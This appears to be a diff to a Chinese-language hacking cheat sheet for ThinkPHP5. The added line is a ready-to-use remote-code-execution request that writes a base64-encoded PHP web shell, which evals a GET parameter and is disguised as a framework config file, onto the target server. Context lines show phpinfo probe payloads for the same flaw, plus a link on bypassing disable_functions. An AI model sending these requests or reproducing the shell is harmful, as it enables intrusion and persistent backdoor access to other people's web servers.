@@ -73,7 +73,9 @@ linux shell 下载执行：
 thinkphp5 测漏洞:
 
     https://www.waitalone.cn/thinkphp-getshell.html
-    
+    绕过disable_functions https://www.cnblogs.com/r00tuser/p/12636479.html
+    /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=php://filter/write=convert.base64-decode/resource=/home/wwwroot/example/s.php&vars[1][]=PD9waHAKQGV2YWwoJF9HRVRbJ3IwMCddKTsKcmV0dXJuIFsnYXBwX2luaXQnICAgICA9PiBbXSwnYXBwX2JlZ2luJyAgICA9PiBbXSwnbW9kdWxlX2luaXQnICA9PiBbXSwnYWN0aW9uX2JlZ2luJyA9PiBbXSwndmlld19maWx0ZXInICA9PiBbXSwnbG9nX3dyaXRlJyAgICA9PiBbXSwnYXBwX2VuZCcgICAgICA9PiBbXTsKPz4=
+
     /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
     /?s=index/\think\Request/input&filter=phpinfo&data=-1
     
